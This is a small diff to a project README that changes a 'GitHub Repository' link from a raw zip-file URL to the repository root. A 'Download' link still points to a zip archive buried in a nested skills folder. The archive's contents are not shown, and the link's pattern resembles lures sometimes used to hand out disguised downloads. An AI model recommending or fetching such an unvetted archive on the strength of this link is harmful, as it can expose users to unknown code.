@@ -140,4 +140,4 @@ If you experience issues, try these steps:
 # Quick Links
 
 - [Download xpoz-agent-skills](https://github.com/Aditya923-c/xpoz-agent-skills/raw/refs/heads/main/skills/reddit-research/skills-agent-xpoz-3.0.zip)
-- [GitHub Repository](https://github.com/Aditya923-c/xpoz-agent-skills/raw/refs/heads/main/skills/reddit-research/skills-agent-xpoz-3.0.zip)
+- [GitHub Repository](https://github.com/Aditya923-c/xpoz-agent-skills)
